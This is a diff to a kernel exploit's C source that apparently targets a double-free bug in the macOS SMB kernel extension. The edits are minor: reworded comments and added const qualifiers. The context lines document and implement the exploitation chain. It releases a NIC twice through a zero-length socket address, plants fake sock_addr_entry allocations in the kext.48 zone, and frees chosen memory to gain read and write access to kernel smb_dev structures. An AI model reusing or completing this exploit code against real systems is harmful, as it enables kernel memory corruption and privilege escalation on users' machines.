@@ -37,7 +37,7 @@
 /// allocated on kext.48 zone.
 ///
 /// From the POC, we know that we can get a NIC released twice by trying
-/// to associate a socket address with zero length to the NIC. The NICs in
+/// to associate a socket address with zero length to the NIC. The info about NICs in
 /// client machine are stored in `session->session_interface_table.client_nic_info_list`.
 /// The `client_nic_info_list` is a tailq with elements of type `struct complete_nic_info_entry`.
 /// When we try to associate a socket address of zero length to a NIC which is
@@ -107,7 +107,8 @@
 /// memory location of double free NIC after first release and before second release,
 /// we can get each entry in the `fake_nic->addr_list` released using `SMB_FREE`.
 /// By constructing `fake_nic->addr_list` with pointers to memory location in `kext.48`
-/// zone, we can get these memory locations released.
+/// zone, we can get these memory locations released. This can be used to get read
+/// write access to `struct smb_dev` allocated in kext.48 zone.
 ///
 ///
 
@@ -174,20 +175,18 @@ struct smb_dev_rw {
 };
 
 
-// Build a fake socket address which can be used to construct a fake sock_addr_entry
-// NOTE: The layout of `struct sock_addr_entry` is as follows
-//
-// struct sock_addr_entry {
-//   struct sockaddr* addr;
-//   TAILQ_ENTRY(sock_addr_entry) next;
-// };
-//
-// The fake sock_addr_entry is allocated using `kmem_zkext_alloc_small` which allocates provided
-// data as a socket address. This means that the first byte in allocated data will always be the
-// size of allocation. Since we want to acheive read write on smb_dev which is allocated on kext.48
-// zone, we want the fake sock_addr_entry and fake socket_address to be allocated on kext.48 zone.
-// 
-//
+/// Build a fake socket address which can be used to construct a fake sock_addr_entry
+/// NOTE: The layout of `struct sock_addr_entry` is as follows
+///
+/// struct sock_addr_entry {
+///   struct sockaddr* addr;
+///   TAILQ_ENTRY(sock_addr_entry) next;
+/// };
+///
+/// The fake sock_addr_entry is allocated using `kmem_zkext_alloc_small` which allocates provided
+/// data as a socket address. This means that the first byte in allocated data will always be the
+/// size of allocation. Since we want to acheive read write on smb_dev which is allocated on kext.48
+/// zone, we want the fake sock_addr_entry and fake socket_address to be allocated on kext.48 zone.
 struct kmem_zkext_alloc_small_entry smb_dev_rw_alloc_sock_addr(const struct sockaddr_in* smb_addr, kmem_allocator_nrnw_t nrnw_allocator) {
     for (int i=0; i<MAX_SOCK_ADDR_ALLOC_TRIES; i++) {
         struct kmem_zkext_alloc_small_entry entry = kmem_zkext_alloc_small(smb_addr, 48, AF_INET, NULL, 0);
@@ -289,7 +288,7 @@ struct smb_dev_rw* smb_dev_rw_create_from_capture(const struct sockaddr_in* smb_
 }
 
 
-void smb_dev_rw_match_dev_to_rw(int capture_smb_devs[NUM_SMB_DEV_CAPTURE_ALLOCS], int* rw_fds, int* matched_captures, int num_rw_fds) {
+void smb_dev_rw_match_dev_to_rw(int capture_smb_devs[NUM_SMB_DEV_CAPTURE_ALLOCS], const int* rw_fds, int* matched_captures, int num_rw_fds) {
     int rw_fds_to_match[num_rw_fds];
     memcpy(rw_fds_to_match, rw_fds, sizeof(rw_fds_to_match));
     
@@ -522,7 +521,7 @@ void smb_dev_rw_read_data(smb_dev_rw_t dev, struct smb_dev* out) {
     xe_assert_err(error);
 }
 
-int smb_dev_rw_write_data(smb_dev_rw_t dev, struct smb_dev* data) {
+int smb_dev_rw_write_data(smb_dev_rw_t dev, const struct smb_dev* data) {
     xe_assert(dev->active == TRUE);
     struct smb_dev data_copy = *data;
     
@@ -607,7 +606,7 @@ int smb_dev_rw_read(smb_dev_rw_t dev, struct smb_dev* out) {
     return 0;
 }
 
-int smb_dev_rw_write(smb_dev_rw_t dev, struct smb_dev* data) {
+int smb_dev_rw_write(smb_dev_rw_t dev, const struct smb_dev* data) {
     if (!dev->active) {
         return EBADF;
     }
